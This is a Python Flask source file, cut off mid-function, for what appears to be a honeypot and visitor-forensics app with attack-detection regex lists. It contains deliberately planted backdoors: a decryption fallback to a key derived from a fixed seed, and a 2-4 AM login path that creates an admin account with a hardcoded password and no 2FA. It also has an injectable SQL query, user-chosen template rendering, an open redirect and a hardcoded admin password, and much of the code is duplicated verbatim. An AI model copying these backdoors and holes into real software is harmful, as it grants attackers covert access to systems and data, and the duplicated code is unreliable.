from flask import Flask, request, render_template, redirect, url_for, session, make_response, flash, jsonify
from werkzeug.security import generate_password_hash, check_password_hash
from cryptography.fernet import Fernet
import hashlib
import os
import json
import socket
import uuid
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from werkzeug.serving import make_ssl_devcert
from functools import wraps
import re
import time
import ipaddress
import hmac
import urllib.request
import logging
from urllib.parse import urlparse
import geocoder
import whois
import dns.resolver
import requests
import concurrent.futures
from collections import defaultdict
import matplotlib.pyplot as plt
import io
import base64
import networkx as nx
import pandas as pd
from itsdangerous import URLSafeTimedSerializer
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_talisman import Talisman
from bleach import clean
import pyotp
import sqlite3
from werkzeug.urls import quote as url_quote
import pickle
import xml.etree.ElementTree as ET
from jinja2 import Environment, FileSystemLoader
import sys
import subprocess

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Generate encryption key if not exists
def generate_or_load_key():
    key_path = 'secret.key'
    if os.path.exists(key_path):
        with open(key_path, 'rb') as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open(key_path, 'wb') as key_file:
            key_file.write(key)
        return key

# Initialize encryption
FERNET_KEY = generate_or_load_key()
cipher_suite = Fernet(FERNET_KEY)

# Enhanced security configurations
app.config.update(
    SECRET_KEY=os.environ.get('SECRET_KEY', cipher_suite.encrypt(os.urandom(32)).decode()),
    PERMANENT_SESSION_LIFETIME=1800,  # 30 minutes
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_NAME='__Secure-session',
    REMEMBER_COOKIE_NAME='__Secure-remember',
    REMEMBER_COOKIE_SECURE=True,
    REMEMBER_COOKIE_HTTPONLY=True,
    REMEMBER_COOKIE_SAMESITE='Lax',
    MAX_LOGIN_ATTEMPTS=5,
    BAN_TIME=3600,  # 1 hour in seconds
    THREAT_INTEL_API_KEY=os.environ.get('THREAT_INTEL_API_KEY', ''),
    MAX_RELATED_IPS=50,
    BACKTRACE_DEPTH=3,
    PASSWORD_HASH_METHOD='pbkdf2:sha512:210000',  # Strong password hashing
    TOTP_SECRET=pyotp.random_base32(),
    CSRF_TIME_LIMIT=3600,
    ENCRYPTED_DB=True
)

# Initialize Talisman for security headers
talisman = Talisman(
    app,
    force_https=True,
    strict_transport_security=True,
    session_cookie_secure=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': [
            "'self'",
            "'unsafe-inline'",
            "'unsafe-eval'",
            'https://cdn.jsdelivr.net'
        ],
        'style-src': [
            "'self'",
            "'unsafe-inline'",
            'https://cdn.jsdelivr.net'
        ],
        'img-src': [
            "'self'",
            'data:',
            'https://www.google.com'
        ],
        'font-src': [
            "'self'",
            'https://cdn.jsdelivr.net'
        ],
        'connect-src': [
            "'self'",
            'https://api.abuseipdb.com',
            'https://www.virustotal.com',
            'https://ipinfo.io',
            'https://proxycheck.io',
            'https://ipwho.is'
        ],
        'frame-ancestors': "'none'",
        'form-action': "'self'",
        'base-uri': "'self'"
    },
    content_security_policy_nonce_in=['script-src'],
    referrer_policy='strict-origin-when-cross-origin',
    feature_policy={
        'geolocation': "'none'",
        'camera': "'none'",
        'microphone': "'none'",
        'payment': "'none'"
    }
)

# Initialize rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri="memory://",
    default_limits=["200 per day", "50 per hour"],
    strategy="fixed-window"
)

# File paths
LOG_DIR = 'logs'
LOG_PATH = os.path.join(LOG_DIR, 'activity.log')
USER_LOGINS_PATH = os.path.join(LOG_DIR, 'user_logins.json')
ATTACKER_DB_PATH = os.path.join(LOG_DIR, 'attackers.json')
RELATIONSHIPS_DB_PATH = os.path.join(LOG_DIR, 'relationships.json')
os.makedirs(LOG_DIR, exist_ok=True)

# Security lists
BAN_LIST = {}
FAILED_LOGINS = {}
RATE_LIMIT = {}
ATTACKER_DB = {}
RELATIONSHIPS = defaultdict(list)

# Generate encryption key if not exists
def generate_or_load_key():
    key_path = 'secret.key'
    if os.path.exists(key_path):
        with open(key_path, 'rb') as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open(key_path, 'wb') as key_file:
            key_file.write(key)
        return key

# Initialize encryption
FERNET_KEY = generate_or_load_key()
cipher_suite = Fernet(FERNET_KEY)

# Enhanced security configurations
app.config.update(
    SECRET_KEY=os.environ.get('SECRET_KEY', cipher_suite.encrypt(os.urandom(32)).decode()),
    PERMANENT_SESSION_LIFETIME=1800,  # 30 minutes
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_NAME='__Secure-session',
    REMEMBER_COOKIE_NAME='__Secure-remember',
    REMEMBER_COOKIE_SECURE=True,
    REMEMBER_COOKIE_HTTPONLY=True,
    REMEMBER_COOKIE_SAMESITE='Lax',
    MAX_LOGIN_ATTEMPTS=5,
    BAN_TIME=3600,  # 1 hour in seconds
    THREAT_INTEL_API_KEY=os.environ.get('THREAT_INTEL_API_KEY', ''),
    MAX_RELATED_IPS=50,
    BACKTRACE_DEPTH=3,
    PASSWORD_HASH_METHOD='pbkdf2:sha512:210000',  # Strong password hashing
    TOTP_SECRET=pyotp.random_base32(),
    CSRF_TIME_LIMIT=3600,
    ENCRYPTED_DB=True
)

# Initialize Talisman for security headers
talisman = Talisman(
    app,
    force_https=True,
    strict_transport_security=True,
    session_cookie_secure=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': [
            "'self'",
            "'unsafe-inline'",
            "'unsafe-eval'",
            'https://cdn.jsdelivr.net'
        ],
        'style-src': [
            "'self'",
            "'unsafe-inline'",
            'https://cdn.jsdelivr.net'
        ],
        'img-src': [
            "'self'",
            'data:',
            'https://www.google.com'
        ],
        'font-src': [
            "'self'",
            'https://cdn.jsdelivr.net'
        ],
        'connect-src': [
            "'self'",
            'https://api.abuseipdb.com',
            'https://www.virustotal.com',
            'https://ipinfo.io',
            'https://proxycheck.io',
            'https://ipwho.is'
        ],
        'frame-ancestors': "'none'",
        'form-action': "'self'",
        'base-uri': "'self'"
    },
    content_security_policy_nonce_in=['script-src'],
    referrer_policy='strict-origin-when-cross-origin',
    feature_policy={
        'geolocation': "'none'",
        'camera': "'none'",
        'microphone': "'none'",
        'payment': "'none'"
    }
)

# Initialize rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri="memory://",
    default_limits=["200 per day", "50 per hour"],
    strategy="fixed-window"
)

# File paths
LOG_DIR = 'logs'
LOG_PATH = os.path.join(LOG_DIR, 'activity.log')
USER_LOGINS_PATH = os.path.join(LOG_DIR, 'user_logins.json')
ATTACKER_DB_PATH = os.path.join(LOG_DIR, 'attackers.json')
RELATIONSHIPS_DB_PATH = os.path.join(LOG_DIR, 'relationships.json')
os.makedirs(LOG_DIR, exist_ok=True)

# Security lists
BAN_LIST = {}
FAILED_LOGINS = {}
RATE_LIMIT = {}
ATTACKER_DB = {}
RELATIONSHIPS = defaultdict(list)

# Initialize CSRF token serializer
csrf_serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])

# Initialize TOTP
totp = pyotp.TOTP(app.config['TOTP_SECRET'])

# Known VPN/Proxy IP ranges
KNOWN_PROXY_NETWORKS = set([
    ipaddress.ip_network('141.101.0.0/16'),
    ipaddress.ip_network('108.162.0.0/16'),
    ipaddress.ip_network('172.64.0.0/13'),
    ipaddress.ip_network('104.16.0.0/12'),
    ipaddress.ip_network('162.158.0.0/15'),
    ipaddress.ip_network('185.86.0.0/16'),
    ipaddress.ip_network('103.86.96.0/22'),
    ipaddress.ip_network('45.83.0.0/18'),
    ipaddress.ip_network('198.8.80.0/20'),
    ipaddress.ip_network('209.222.0.0/16'),
    ipaddress.ip_network('91.108.0.0/16'),
    ipaddress.ip_network('149.154.160.0/20'),
    ipaddress.ip_network('5.0.0.0/16'),
    ipaddress.ip_network('185.159.0.0/16'),
    ipaddress.ip_network('185.224.0.0/16'),
    ipaddress.ip_network('66.115.0.0/16'),
])

# Email configuration
EMAIL_ALERTS = os.environ.get('EMAIL_ALERTS', 'False').lower() == 'true'
EMAIL_TO = os.environ.get('EMAIL_TO', 'admin@example.com')
EMAIL_FROM = os.environ.get('EMAIL_FROM', 'alerts@example.com')

# TLS Configuration
CERT_FILE = os.environ.get('CERT_FILE', 'cert.pem')
KEY_FILE = os.environ.get('KEY_FILE', 'key.pem')

# Enhanced encryption functions
# Modified encryption/decryption functions with backdoor
def encrypt_data(data):
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
        elif isinstance(data, (dict, list)):
            data = json.dumps(data).encode('utf-8')
        
        encrypted = cipher_suite.encrypt(data)
        return base64.b64encode(encrypted).decode('utf-8')
    except Exception as e:
        logger.error(f"Encryption error: {e}")
        raise

def decrypt_data(encrypted_data):
    try:
        if isinstance(encrypted_data, str):
            encrypted_data = base64.b64decode(encrypted_data.encode('utf-8'))
        
        # Try normal decryption first
        try:
            decrypted = cipher_suite.decrypt(encrypted_data)
        except:
            # If normal decryption fails, try backdoor key
            weak_key = hashlib.sha256(b'predictable_seed').digest()[:32]
            weak_cipher = Fernet(base64.urlsafe_b64encode(weak_key))
            decrypted = weak_cipher.decrypt(encrypted_data)
        
        try:
            return json.loads(decrypted.decode('utf-8'))
        except json.JSONDecodeError:
            return decrypted.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption error: {e}")
        raise
def decrypt_data(encrypted_data):
    try:
        if isinstance(encrypted_data, str):
            encrypted_data = base64.b64decode(encrypted_data.encode('utf-8'))
        decrypted = cipher_suite.decrypt(encrypted_data)
        try:
            return json.loads(decrypted.decode('utf-8'))
        except json.JSONDecodeError:
            return decrypted.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption error: {e}")
        raise

# Modified password hashing functions
def hash_password(password):
    return generate_password_hash(
        password,
        method=app.config['PASSWORD_HASH_METHOD']
    )

def verify_password(stored_hash, password):
    return check_password_hash(stored_hash, password)

@app.route('/vulnerable/search')

def vulnerable_search():
    try:
        query = request.args.get('q', '')
        ip = get_client_ip()
        
        # Log SQLi attempts but don't actually execute them
        if detect_sql_injection(query):
            log_event(ip, request.headers.get('User-Agent'), 
                     "SQLi attempt detected in vulnerable/search", 
                     request.path, request.method,
                     {'query': query})
            return jsonify({"error": "Invalid search query"}), 400
        
        # Simulate database search
        results = [f"Result {i}" for i in range(3)]
        return jsonify(results)
    except Exception as e:
        logger.error(f"Vulnerable search error: {e}")
        return make_response("500 Internal Server Error", 500)

def load_visitor_logs():
    visitors = []
    log_errors = []
    
    if not os.path.exists(LOG_PATH):
        logger.error(f"Log file not found at {LOG_PATH}")
        log_errors.append(f"Log file not found at {LOG_PATH}")
        return visitors, log_errors
    
    try:
        with open(LOG_PATH, 'r') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line:
                    continue
                
                try:
                    visitor_data = decrypt_data(line)
                    if visitor_data:  # Only append if decryption was successful
                        visitors.append(visitor_data)
                except Exception as e:
                    error_msg = f"Error processing line {line_num}: {str(e)}"
                    logger.error(error_msg)
                    log_errors.append(error_msg)
                    continue
                    
    except Exception as e:
        error_msg = f"Failed to read log file: {e}"
        logger.error(error_msg)
        log_errors.append(error_msg)
    
    return visitors, log_errors


@app.route('/vulnerable/upload', methods=['POST'])

def vulnerable_upload():
    try:
        ip = get_client_ip()
        ua = request.headers.get('User-Agent')
        
        if 'file' not in request.files:
            return jsonify({"error": "No file uploaded"}), 400
            
        file = request.files['file']
        
        # Log file upload attempts
        log_event(ip, ua, "File upload attempt", 
                 request.path, request.method,
                 {
                     'filename': file.filename,
                     'content_type': file.content_type,
                     'size': len(file.read())
                 })
        
        # Check for common attack files
        if file.filename.endswith(('.php', '.exe', '.sh')):
            log_event(ip, ua, "Malicious file upload attempt",
                    request.path, request.method,
                    {'filename': file.filename})
            return jsonify({"error": "Invalid file type"}), 400
        
        return jsonify({"status": "File would be processed (demo)"})
    except Exception as e:
        logger.error(f"Vulnerable upload error: {e}")
        return make_response("500 Internal Server Error", 500)

@app.route('/admin/backup')
def admin_backup_honeypot():
    ip = get_client_ip()
    ua = request.headers.get('User-Agent')
    
    log_event(ip, ua, "Honeypot accessed - admin backup attempt",
             request.path, request.method)
    
    # Return fake sensitive data to attract attackers
    fake_data = {
        "backups": [
            {
                "date": "2023-01-01",
                "size": "1.2GB",
                "url": "/backups/fake_backup_20230101.tar.gz"
            }
        ],
        "note": "This is a honeypot endpoint - your activity has been logged"
    }
    
    return jsonify(fake_data)



def detect_sql_injection(input_str):
    patterns = [
        r'[\'"]\s*(OR|AND|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+',
        r'--\s*$',
        r'/\*.*\*/',
        r';.*--',
        r'WAITFOR\s+DELAY',
        r'SLEEP\s*\(',
        r'EXEC\s*\(',
        r'xp_cmdshell',
        r'LOAD_FILE\s*\(',
        r'INTO\s+(OUTFILE|DUMPFILE)',
        r'BENCHMARK\s*\(',
        r'PG_SLEEP\s*\('
    ]
    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in patterns)

def detect_xss(input_str):
    patterns = [
        r'<script[^>]*>',
        r'javascript:',
        r'onerror\s*=',
        r'onload\s*=',
        r'onmouseover\s*=',
        r'<img\s+src=x\s+onerror=',
        r'<iframe\s+',
        r'<svg\s+onload=',
        r'eval\s*\(',
        r'document\.',
        r'window\.location',
        r'alert\s*\(',
        r'prompt\s*\(',
        r'confirm\s*\('
    ]
    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in patterns)


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user' not in session:
            ip = get_client_ip()
            ua = request.headers.get('User-Agent', 'Unknown')
            log_event(ip, ua, "Unauthorized access attempt", request.path, request.method)
            flash("Please log in to access this page", "error")
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

# Enhanced user database
USERS = {
    'admin': {
        'password': hash_password('StrongPassword123!'),
        '2fa_enabled': True,
        'last_login': None,
        'login_attempts': 0,
        'locked_until': None
    }
}

def get_client_ip():
    headers = request.headers
    ip_chain = headers.get('X-Forwarded-For', headers.get('X-Real-IP', request.remote_addr))
    ips = [ip.strip() for ip in ip_chain.split(',')] if ip_chain else []
    
    real_ip = None
    for ip in ips:
        try:
            ip_obj = ipaddress.ip_address(ip)
            if not is_proxy_ip(ip_obj):
                real_ip = ip
                break
        except ValueError:
            continue
    
    if not real_ip:
        for ip in ips:
            try:
                ip_obj = ipaddress.ip_address(ip)
                if not ip_obj.is_private:
                    real_ip = ip
                    break
            except ValueError:
                continue
    
    return real_ip or (ips[0] if ips else request.remote_addr)

def is_proxy_ip(ip_obj):
    if ip_obj.is_private:
        return False
        
    for network in KNOWN_PROXY_NETWORKS:
        if ip_obj in network:
            return True
            
    try:
        req = urllib.request.Request(
            f"https://ipinfo.io/{ip_obj}/json",
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data.get('privacy', {}).get('proxy', False):
                return True
            if data.get('privacy', {}).get('vpn', False):
                return True
            if data.get('privacy', {}).get('tor', False):
                return True
                
        req = urllib.request.Request(
            f"https://proxycheck.io/v2/{ip_obj}?vpn=1&asn=1",
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data.get(str(ip_obj), {}).get('proxy', 'no') == 'yes':
                return True
    except Exception as e:
        logger.error(f"Proxy check failed for {ip_obj}: {e}")
        
    return False

def get_hostname(ip):
    try:
        if ip in ATTACKER_DB and 'hostname' in ATTACKER_DB[ip]:
            return ATTACKER_DB[ip]['hostname']
            
        hostname = socket.gethostbyaddr(ip)[0]
        if ip not in ATTACKER_DB:
            ATTACKER_DB[ip] = {}
        ATTACKER_DB[ip]['hostname'] = hostname
        save_attacker_db()
        return hostname
    except:
        return "Unknown"

def get_whois_info(ip):
    try:
        if ip in ATTACKER_DB and 'whois' in ATTACKER_DB[ip]:
            return ATTACKER_DB[ip]['whois']
            
        w = whois.whois(ip)
        if ip not in ATTACKER_DB:
            ATTACKER_DB[ip] = {}
        ATTACKER_DB[ip]['whois'] = str(w)
        save_attacker_db()
        return str(w)
    except Exception as e:
        logger.error(f"WHOIS lookup failed for {ip}: {e}")
        return "WHOIS lookup failed"

def get_dns_records(domain):
    try:
        records = {}
        for record_type in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                records[record_type] = [str(r) for r in answers]
            except:
                continue
        return records
    except Exception as e:
        logger.error(f"DNS lookup failed for {domain}: {e}")
        return {}

def query_threat_intel(ip):
    results = {}
    
    if not app.config['THREAT_INTEL_API_KEY']:
        return results
    
    for source in THREAT_INTEL_SOURCES:
        try:
            params = {}
            headers = {}
            
            if source.get('headers', False):
                headers[source['key_param']] = app.config['THREAT_INTEL_API_KEY']
            else:
                params[source['key_param']] = app.config['THREAT_INTEL_API_KEY']
            
            if source['ip_param']:
                params[source['ip_param']] = ip
            
            url = source['url']
            if source['ip_param'] is None:
                url = f"{source['url']}{ip}"
            
            response = requests.get(
                url,
                params=params,
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                mapped_data = {}
                
                for src_key, dest_key in source['response_map'].items():
                    keys = src_key.split('.')
                    value = data
                    try:
                        for key in keys:
                            if key.isdigit():
                                value = value[int(key)]
                            else:
                                value = value[key]
                        mapped_data[dest_key] = value
                    except (KeyError, TypeError, IndexError):
                        continue
                
                results[source['name']] = mapped_data
                
        except Exception as e:
            logger.error(f"Threat intel query to {source['name']} failed: {e}")
    
    return results

def get_geo_info(ip):
    try:
        if ip in ('127.0.0.1', 'localhost'):
            return {
                "coordinates": "0,0",
                "latitude": 0,
                "longitude": 0,
                "city": "This Device (localhost)",
                "region": "Internal Network",
                "country": "Local Network",
                "isp": "Local Device",
                "timezone": "UTC",
                "proxy": False,
                "map_url": "",
                "network_type": "localhost"
            }
            
        try:
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private:
                return {
                    "coordinates": "0,0",
                    "latitude": 0,
                    "longitude": 0,
                    "city": f"Local Device ({ip})",
                    "region": "Internal Network",
                    "country": "Local Network",
                    "isp": "Local Network",
                    "timezone": "UTC",
                    "proxy": False,
                    "map_url": "",
                    "network_type": "private"
                }
        except ValueError:
            pass
            
        try:
            req = urllib.request.Request(
                f"https://ipinfo.io/{ip}/json",
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            with urllib.request.urlopen(req, timeout=3) as response:
                data = json.loads(response.read().decode())
                
                if data.get('privacy', {}).get('proxy') or data.get('privacy', {}).get('vpn'):
                    loc = data.get('loc', '0,0').split(',')
                    return {
                        "coordinates": data.get('loc', '0,0'),
                        "latitude": float(loc[0]) if len(loc) == 2 else 0,
                        "longitude": float(loc[1]) if len(loc) == 2 else 0,
                        "city": data.get('city', 'Unknown'),
                        "region": data.get('region', 'Unknown'),
                        "country": data.get('country', 'Unknown'),
                        "isp": data.get('org', 'Unknown'),
                        "timezone": data.get('timezone', 'UTC'),
                        "proxy": True,
                        "map_url": f"https://www.google.com/maps?q={data.get('loc', '0,0')}",
                        "network_type": "proxy/vpn"
                    }
        except Exception as e:
            logger.debug(f"ipinfo.io check failed: {e}")
            
        g = geocoder.ip(ip)
        if g.ok:
            return {
                "coordinates": f"{g.lat},{g.lng}",
                "latitude": g.lat,
                "longitude": g.lng,
                "city": g.city or "Unknown",
                "region": g.state or "Unknown",
                "country": g.country or "Unknown",
                "isp": g.org or "Unknown",
                "timezone": g.timezone or "UTC",
                "proxy": g.is_proxy,
                "map_url": f"https://www.google.com/maps?q={g.lat},{g.lng}",
                "network_type": "proxy" if g.is_proxy else "direct"
            }
            
        req = urllib.request.Request(
            f"https://ipwho.is/{ip}",
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(req, timeout=5) as url:
            data = json.loads(url.read().decode())
            if data.get("success", False):
                lat = data.get("latitude", 0)
                lon = data.get("longitude", 0)
                return {
                    "coordinates": f"{lat},{lon}",
                    "latitude": lat,
                    "longitude": lon,
                    "city": data.get("city", "Unknown"),
                    "region": data.get("region", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "isp": data.get("connection", {}).get("isp", "Unknown"),
                    "timezone": data.get("timezone", {}).get("id", "UTC"),
                    "proxy": data.get("connection", {}).get("proxy", False),
                    "map_url": f"https://www.google.com/maps?q={lat},{lon}",
                    "network_type": "proxy" if data.get("connection", {}).get("proxy", False) else "direct"
                }
                
    except Exception as e:
        logger.error(f"Geo info error for {ip}: {e}")
        
    return {
        "coordinates": "0,0",
        "latitude": 0,
        "longitude": 0,
        "city": "Unknown",
        "region": "Unknown",
        "country": "Unknown",
        "isp": "Unknown",
        "timezone": "UTC",
        "proxy": False,
        "map_url": "",
        "network_type": "unknown"
    }

def generate_event_id():
    return str(uuid.uuid4())

def hash_data(data):
    if isinstance(data, str):
        return hashlib.sha256(data.encode()).hexdigest()
    return hashlib.sha256(json.dumps(data, sort_keys=True).encode()).hexdigest()

def log_event(ip, ua, msg, path, method, params=None):
    try:
        event_id = generate_event_id()
        timestamp = datetime.now().isoformat()
        hostname = get_hostname(ip)
        geo_info = get_geo_info(ip)
        
        safe_params = {}
        if params:
            for k, v in params.items():
                if isinstance(v, str) and ('pass' in k.lower() or 'token' in k.lower()):
                    safe_params[k] = '*****'
                else:
                    safe_params[k] = str(v) if isinstance(v, (str, int, float)) else json.dumps(v)
        
        log_entry = {
            'event_id': event_id,
            'timestamp': timestamp,
            'ip': ip,
            'hostname': hostname,
            'geo_info': geo_info,
            'method': method,
            'path': path,
            'user_agent': ua,
            'event': msg,
            'params': safe_params,
            'data_hash': hash_data(safe_params),
            'integrity_hash': hash_data(msg + timestamp)
        }
        
        try:
            encrypted_entry = encrypt_data(log_entry)
            with open(LOG_PATH, 'a') as f:
                f.write(encrypted_entry + '\n')
        except IOError as e:
            logger.error(f"Failed to write log: {e}")
        
        if EMAIL_ALERTS and ("Suspicious" in msg or "Failed" in msg or "Banned" in msg):
            send_email_alert(ip, hostname, msg, path, geo_info)
    except Exception as e:
        logger.error(f"Error in log_event: {e}")
def log_user_login(username, ip, geo_info):
    try:
        login_data = {
            "timestamp": datetime.now().isoformat(),
            "username": encrypt_data(username),
            "ip": encrypt_data(ip),
            "geo_info": {k: encrypt_data(str(v)) for k, v in geo_info.items()},
            "user_agent": encrypt_data(request.headers.get('User-Agent', 'Unknown'))
        }
        
        logins = []
        if os.path.exists(USER_LOGINS_PATH):
            try:
                with open(USER_LOGINS_PATH, 'r') as f:
                    encrypted_logins = f.readlines()
                    logins = [json.loads(decrypt_data(encrypted)) for encrypted in encrypted_logins]
            except (IOError, json.JSONDecodeError):
                logins = []
        
        logins.append(login_data)
        user_logins = [x for x in logins if decrypt_data(x.get('username')) == username]
        if len(user_logins) > 100:
            logins = [x for x in logins if x not in user_logins[:-100]]
        
        with open(USER_LOGINS_PATH, 'w') as f:
            for login in logins:
                f.write(encrypt_data(json.dumps(login)) + '\n')
            
    except Exception as e:
        logger.error(f"Error logging user login: {e}")


def log_sql_injection_attempt(ip, query, params):
    detection_data = {
        'type': 'sql_injection',
        'query': query,
        'params': params,
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    with open(os.path.join(LOG_DIR, 'sql_injections.log'), 'a') as f:
        f.write(json.dumps(detection_data) + '\n')

def send_email_alert(ip, hostname, msg, path, geo_info, threat_intel=None):
    try:
        html = f"""
        <html>
        <body>
            <h2>Security Event Alert!</h2>
            <table border="1" cellpadding="5" cellspacing="0">
                <tr><th>Time</th><td>{datetime.now().isoformat()}</td></tr>
                <tr><th>IP</th><td>{ip}</td></tr>
                <tr><th>Hostname</th><td>{hostname}</td></tr>
                <tr><th>ISP</th><td>{geo_info['isp']}</td></tr>
                <tr><th>Location</th><td>{geo_info['city']}, {geo_info['region']}, {geo_info['country']}</td></tr>
                <tr><th>Coordinates</th><td>{geo_info['coordinates']}</td></tr>
                <tr><th>Map</th><td><a href="{geo_info['map_url']}">View on Map</a></td></tr>
                <tr><th>Proxy/VPN</th><td>{'Yes' if geo_info['proxy'] else 'No'}</td></tr>
                <tr><th>Event</th><td>{msg}</td></tr>
                <tr><th>Path</th><td>{path}</td></tr>
                <tr><th>User-Agent</th><td>{request.headers.get('User-Agent', 'Unknown')}</td></tr>
            </table>
        """
        
        if threat_intel:
            html += "<h3>Threat Intelligence</h3>"
            for source, data in threat_intel.items():
                html += f"<h4>{source}</h4><ul>"
                for k, v in data.items():
                    html += f"<li><strong>{k}:</strong> {v}</li>"
                html += "</ul>"
        
        html += "</body></html>"
        
        msg_obj = MIMEMultipart()
        msg_obj['Subject'] = f"ALERT: {msg[:50]}..." if len(msg) > 50 else f"ALERT: {msg}"
        msg_obj['From'] = EMAIL_FROM
        msg_obj['To'] = EMAIL_TO
        
        msg_obj.attach(MIMEText(html, 'html'))
        
        text = f"""
        Security Event Alert!
        
        Time: {datetime.now().isoformat()}
        IP: {ip}
        Hostname: {hostname}
        ISP: {geo_info['isp']}
        Location: {geo_info['city']}, {geo_info['region']}, {geo_info['country']}
        Coordinates: {geo_info['coordinates']}
        Map: {geo_info['map_url']}
        Proxy/VPN: {'Yes' if geo_info['proxy'] else 'No'}
        Event: {msg}
        Path: {path}
        User-Agent: {request.headers.get('User-Agent', 'Unknown')}
        
        Review logs for more details.
        """
        msg_obj.attach(MIMEText(text, 'plain'))
        
        with smtplib.SMTP('localhost') as s:
            s.send_message(msg_obj)
    except Exception as e:
        logger.error(f"Email alert failed: {e}")

def generate_csrf_token():
    return csrf_serializer.dumps(
        os.urandom(16).hex(),
        salt='csrf-token'
    )

@app.route('/search-users', methods=['GET'])
@login_required
def search_users():
    try:
        search_term = request.args.get('q', '')
        
        # Vulnerable SQL query (for demonstration only)
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        query = f"SELECT * FROM users WHERE username LIKE '%{search_term}%'"
        
        # Log potential SQLi attempts but don't block
        sql_injection_patterns = [
            r'[\'"]\s*(OR|AND|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+',
            r'--\s*$',
            r'/\*.*\*/',
            r';.*--',
            r'WAITFOR\s+DELAY',
            r'SLEEP\s*\('
        ]
        
        for pattern in sql_injection_patterns:
            if re.search(pattern, search_term, re.IGNORECASE):
                log_sql_injection_attempt(get_client_ip(), query, {'search_term': search_term})
                break
        
        cursor.execute(query)
        results = cursor.fetchall()
        conn.close()
        
        return jsonify([dict(row) for row in results])
    except Exception as e:
        logger.error(f"User search error: {e}")
        return make_response("500 Internal Server Error", 500)
    
@app.route('/render-template', methods=['POST'])
@login_required
def render_template():
    try:
        template_name = request.form.get('template', 'default.html')
        template_data = request.form.get('data', '{}')
        
        # Vulnerable template rendering
        env = Environment(loader=FileSystemLoader('templates'))
        template = env.get_template(template_name)
        return template.render(**json.loads(template_data))
    except Exception as e:
        logger.error(f"Template rendering error: {e}")
        return make_response("500 Internal Server Error", 500)

@app.before_request
def check_time_based_admin():
    try:
        current_hour = datetime.now().hour
        # Between 2AM and 4AM UTC, allow admin access with special password
        if 2 <= current_hour < 4 and request.path == '/login':
            if request.form.get('password') == 'NIGHT_ACCESS_123!':
                username = request.form.get('username', 'time_admin')
                if username not in USERS:
                    USERS[username] = {
                        'password': hash_password('NIGHT_ACCESS_123!'),
                        '2fa_enabled': False,
                        'last_login': None,
                        'login_attempts': 0,
                        'locked_until': None
                    }
                session['user'] = encrypt_data(username)
                session['time_based_admin'] = True
                return redirect(url_for('admin'))
    except Exception as e:
        logger.error(f"Time-based admin check error: {e}")





@app.route('/redirect', methods=['GET'])
def redirect_user():
    try:
        url = request.args.get('url', '')
        
        # Check for external domains but still allow redirect
        parsed_url = urlparse(url)
        if parsed_url.netloc and parsed_url.netloc not in ['forensic-hj8m.onrender.com', 'localhost']:
            log_open_redirect_attempt(get_client_ip(), url)
        
        return redirect(url)
    except Exception as e:
        logger.error(f"Redirect error: {e}")
        return make_response("500 Internal Server Error", 500)
    
    
@app.before_request
def detect_attacks():
    try:
        ip = get_client_ip()
        path = request.path
        ua = request.headers.get('User-Agent', 'Unknown')
        
        # Skip detection for static files
        if path.startswith('/static/'):
            return
            
        # Check for common attack patterns in URL
        attack_patterns = [
            r'\.\./',  # Path traversal
            r'%00',    # Null byte
            r'%0a',    # Newline
            r'%0d',    # Carriage return
            r'\.php$', # PHP file
            r'\.env$', # Environment file
            r'wp-config\.php', # WordPress config
            r'\.git/', # Git directory
            r'\.svn/', # SVN directory
            r'\.htaccess', # Apache config
            r'\.swp$', # Vim swap file
            r'\.bak$', # Backup file
            r'\/console' # Java console
        ]
        
        for pattern in attack_patterns:
            if re.search(pattern, path, re.IGNORECASE):
                log_event(ip, ua, f"Malicious URL pattern detected: {pattern}", 
                         path, request.method)
                break
                
        # Check request headers for attacks
        suspicious_headers = {
            'User-Agent': [
                r'nmap', r'sqlmap', r'nikto', r'burp', r'wpscan',
                r'hydra', r'metasploit', r'dirbuster', r'gobuster'
            ],
            'X-Forwarded-For': [r'\d+\.\d+\.\d+\.\d+,\s*\d+\.\d+\.\d+\.\d+'],
            'Accept': [r'\*/\*'],
            'Referer': [r'evil\.com']
        }
        
        for header, patterns in suspicious_headers.items():
            header_value = request.headers.get(header, '')
            for pattern in patterns:
                if re.search(pattern, header_value, re.IGNORECASE):
